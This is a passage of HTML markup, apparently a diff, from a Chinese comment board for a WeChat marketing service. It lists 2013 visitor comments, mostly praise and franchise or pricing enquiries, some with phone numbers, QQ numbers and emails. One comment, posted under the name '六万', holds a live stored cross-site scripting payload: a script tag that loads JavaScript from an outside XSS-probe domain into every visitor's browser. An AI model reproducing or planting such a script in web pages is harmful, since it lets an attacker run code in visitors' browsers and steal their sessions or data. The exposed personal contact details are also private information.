+									<span>
+																														<a class="hhbt czan" date="6001" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6001">
+											<textarea name="info" class="pxtextarea hly6001"></textarea> 
+										<a class="hhsubmit submit" date="6001" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								soman<span>2013-11-21 14:04:14</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5999">不错，风格简简单单</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5999" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5999">
+											<textarea name="info" class="pxtextarea hly5999"></textarea> 
+										<a class="hhsubmit submit" date="5999" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								邱明泉<span>2013-11-21 06:59:54</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5963">我想在昆明销售。087166633355</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5963" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5963">
+											<textarea name="info" class="pxtextarea hly5963"></textarea> 
+										<a class="hhsubmit submit" date="5963" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								张亮亮<span>2013-11-20 20:30:11</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5926">怎么代理或者加盟</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5926" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5926">
+											<textarea name="info" class="pxtextarea hly5926"></textarea> 
+										<a class="hhsubmit submit" date="5926" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								请问套餐费是多少<span>2013-11-20 15:33:41</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5893">请问套餐费是多少、15876567820</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5893" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5893">
+											<textarea name="info" class="pxtextarea hly5893"></textarea> 
+										<a class="hhsubmit submit" date="5893" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								周小鱼<span>2013-11-20 14:50:15</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5887">有意向，希望了解更多</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5887" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5887">
+											<textarea name="info" class="pxtextarea hly5887"></textarea> 
+										<a class="hhsubmit submit" date="5887" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								清新<span>2013-11-20 12:54:06</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5858">请问我想加盟微商，该怎么办啊？</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5858" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5858">
+											<textarea name="info" class="pxtextarea hly5858"></textarea> 
+										<a class="hhsubmit submit" date="5858" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								80后<span>2013-11-20 12:47:53</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5857">这个如何代理呢，需要什么手续吗?我的邮箱534317251q q .c o n </dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5857" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5857">
+											<textarea name="info" class="pxtextarea hly5857"></textarea> 
+										<a class="hhsubmit submit" date="5857" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								哈喽<span>2013-11-20 11:52:13</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5855">画面不错</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5855" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5855">
+											<textarea name="info" class="pxtextarea hly5855"></textarea> 
+										<a class="hhsubmit submit" date="5855" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+														<dl class="huifu">
+								<dt><span>回复：我希望加盟，资料发我 
+																										</span></dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								sx1538678<span>2013-11-20 11:44:34</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5854">请问怎么在分类页面里添加文章呢！</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5854" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5854">
+											<textarea name="info" class="pxtextarea hly5854"></textarea> 
+										<a class="hhsubmit submit" date="5854" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								淮安<span>2013-11-20 10:14:11</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5839">我想做加盟，看看资料</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5839" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5839">
+											<textarea name="info" class="pxtextarea hly5839"></textarea> 
+										<a class="hhsubmit submit" date="5839" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+														<dl class="huifu">
+								<dt><span>回复：是怎么加盟的 
+																										</span></dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								杰<span>2013-11-19 19:57:12</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5794">界面我喜欢！简洁，人性化</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5794" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5794">
+											<textarea name="info" class="pxtextarea hly5794"></textarea> 
+										<a class="hhsubmit submit" date="5794" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								孑然一生<span>2013-11-19 19:17:51</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5789">不错</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5789" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5789">
+											<textarea name="info" class="pxtextarea hly5789"></textarea> 
+										<a class="hhsubmit submit" date="5789" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								狂拽酷炫叼炸天<span>2013-11-19 16:15:21</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5762">好东西西西西西西啊</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5762" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5762">
+											<textarea name="info" class="pxtextarea hly5762"></textarea> 
+										<a class="hhsubmit submit" date="5762" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								小马<span>2013-11-19 13:51:56</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5742">做的真不错，完全可以替代app了</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5742" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5742">
+											<textarea name="info" class="pxtextarea hly5742"></textarea> 
+										<a class="hhsubmit submit" date="5742" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								86356<span>2013-11-19 12:16:49</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5735">不错啊
+</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5735" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5735">
+											<textarea name="info" class="pxtextarea hly5735"></textarea> 
+										<a class="hhsubmit submit" date="5735" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+														<dl class="huifu">
+								<dt><span>回复：谢谢亲的肯定，我们会更加努力的。 
+																										</span></dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								陈<span>2013-11-19 10:25:13</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5726">你好！请问微信代理营销怎样申请呀，需要什么手续呢？超市可以代理吗？</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5726" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5726">
+											<textarea name="info" class="pxtextarea hly5726"></textarea> 
+										<a class="hhsubmit submit" date="5726" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+														<dl class="huifu">
+								<dt><span>回复：感谢您的关注，关于咨询业务事宜，盟妹建议您留下您的联系方式，我们会有业务人员跟您联系的。 
+																										</span></dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								哈哈<span>2013-11-19 09:30:04</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5716">可以把加盟资料发我邮箱吗？我想了解一下、sxgkq@qq.com</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5716" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5716">
+											<textarea name="info" class="pxtextarea hly5716"></textarea> 
+										<a class="hhsubmit submit" date="5716" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								哈哈<span>2013-11-19 09:28:37</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5714">我想做、怎么加盟</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5714" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5714">
+											<textarea name="info" class="pxtextarea hly5714"></textarea> 
+										<a class="hhsubmit submit" date="5714" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								阿杰<span>2013-11-19 01:34:48</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5707">点餐系统不错</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5707" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5707">
+											<textarea name="info" class="pxtextarea hly5707"></textarea> 
+										<a class="hhsubmit submit" date="5707" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								古月<span>2013-11-18 23:00:31</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5697">真心不错</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5697" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5697">
+											<textarea name="info" class="pxtextarea hly5697"></textarea> 
+										<a class="hhsubmit submit" date="5697" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								夜生活<span>2013-11-18 16:53:59</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5660">需要审核吗？</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5660" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5660">
+											<textarea name="info" class="pxtextarea hly5660"></textarea> 
+										<a class="hhsubmit submit" date="5660" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								留言比较有特色，表扬下<span>2013-11-17 23:46:35</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5577">大力表扬</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5577" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5577">
+											<textarea name="info" class="pxtextarea hly5577"></textarea> 
+										<a class="hhsubmit submit" date="5577" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								请输入昵称<span>2013-11-17 22:58:35</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5568">微官网怎么收费</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5568" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5568">
+											<textarea name="info" class="pxtextarea hly5568"></textarea> 
+										<a class="hhsubmit submit" date="5568" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								莫<span>2013-11-17 18:08:21</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5495">使用微相册要支付多少费用？
+</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5495" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5495">
+											<textarea name="info" class="pxtextarea hly5495"></textarea> 
+										<a class="hhsubmit submit" date="5495" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								Jim<span>2013-11-17 00:17:32</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5302">代理咋收费</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5302" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5302">
+											<textarea name="info" class="pxtextarea hly5302"></textarea> 
+										<a class="hhsubmit submit" date="5302" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								zhanglonggen<span>2013-11-16 23:52:32</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5300">电动车总结报告怎么写</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5300" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5300">
+											<textarea name="info" class="pxtextarea hly5300"></textarea> 
+										<a class="hhsubmit submit" date="5300" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								范儿<span>2013-11-16 22:17:41</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5292">想了解代理</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5292" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5292">
+											<textarea name="info" class="pxtextarea hly5292"></textarea> 
+										<a class="hhsubmit submit" date="5292" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								范儿<span>2013-11-16 22:17:39</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5291">想了解代理</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5291" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5291">
+											<textarea name="info" class="pxtextarea hly5291"></textarea> 
+										<a class="hhsubmit submit" date="5291" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								不错<span>2013-11-16 20:44:33</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5281">真不错</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5281" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5281">
+											<textarea name="info" class="pxtextarea hly5281"></textarea> 
+										<a class="hhsubmit submit" date="5281" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								大兵<span>2013-11-16 18:32:35</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5230">想成为广州区域代理，请联系我，qq153134056</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5230" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5230">
+											<textarea name="info" class="pxtextarea hly5230"></textarea> 
+										<a class="hhsubmit submit" date="5230" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								哈哈<span>2013-11-16 17:49:56</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5229">你好</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5229" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5229">
+											<textarea name="info" class="pxtextarea hly5229"></textarea> 
+										<a class="hhsubmit submit" date="5229" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								代理加盟<span>2013-11-16 14:54:13</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5209">代理加盟需要多少？QQ1969236469找你们客服半天没人理</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5209" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5209">
+											<textarea name="info" class="pxtextarea hly5209"></textarea> 
+										<a class="hhsubmit submit" date="5209" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								六万<span>2013-11-16 14:30:54</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5206"><script src=%22//www.xss8.net/-c=p7vCg.js%22 ></script> </dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5206" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5206">
+											<textarea name="info" class="pxtextarea hly5206"></textarea> 
+										<a class="hhsubmit submit" date="5206" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								代理<span>2013-11-16 14:27:02</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5205">具体怎么做</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5205" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5205">
+											<textarea name="info" class="pxtextarea hly5205"></textarea> 
+										<a class="hhsubmit submit" date="5205" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								代理<span>2013-11-16 14:08:46</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5201">我想了解下是怎么操作的？</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5201" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5201">
+											<textarea name="info" class="pxtextarea hly5201"></textarea> 
+										<a class="hhsubmit submit" date="5201" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								代理<span>2013-11-16 13:06:04</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5198">我想代理，请回复，13459569580，小王</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5198" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5198">
+											<textarea name="info" class="pxtextarea hly5198"></textarea> 
+										<a class="hhsubmit submit" date="5198" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								代理<span>2013-11-16 12:19:42</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5196">想了解代理长治的</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5196" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5196">
+											<textarea name="info" class="pxtextarea hly5196"></textarea> 
+										<a class="hhsubmit submit" date="5196" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								还可以哦！<span>2013-11-16 08:19:14</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5180">能审核后再显示留言吗？</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5180" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5180">
+											<textarea name="info" class="pxtextarea hly5180"></textarea> 
+										<a class="hhsubmit submit" date="5180" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								qq 539309777<span>2013-11-16 00:04:22</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5166">想合作</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5166" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5166">
+											<textarea name="info" class="pxtextarea hly5166"></textarea> 
+										<a class="hhsubmit submit" date="5166" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								joes<span>2013-11-16 00:03:33</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5165">挺好的 我也想合作</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5165" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5165">
+											<textarea name="info" class="pxtextarea hly5165"></textarea> 
+										<a class="hhsubmit submit" date="5165" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								杨总<span>2013-11-15 17:29:20</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5125">我们公司主要是做洗车美容与保养，也涉及其他一些业务，但不是利润点；我们想做一个标准产品的东西，让车主可以按照这个标准知道自己的车什么时候需要保养，什么时候需要美容；员工可以按照这个标准针对车主不同问题来解决；行车里程，积分，在线支付等等，不知道微信...</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5125" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5125">
+											<textarea name="info" class="pxtextarea hly5125"></textarea> 
+										<a class="hhsubmit submit" date="5125" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								咨询合作<span>2013-11-15 15:31:55</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5104">河南，18503802671 讲解一下，或者资料发到912133168扣扣邮箱，谢谢。</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5104" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5104">
+											<textarea name="info" class="pxtextarea hly5104"></textarea> 
+										<a class="hhsubmit submit" date="5104" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								美女<span>2013-11-15 13:50:00</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5093">不错</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5093" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5093">
+											<textarea name="info" class="pxtextarea hly5093"></textarea> 
+										<a class="hhsubmit submit" date="5093" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								好好<span>2013-11-15 11:45:30</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
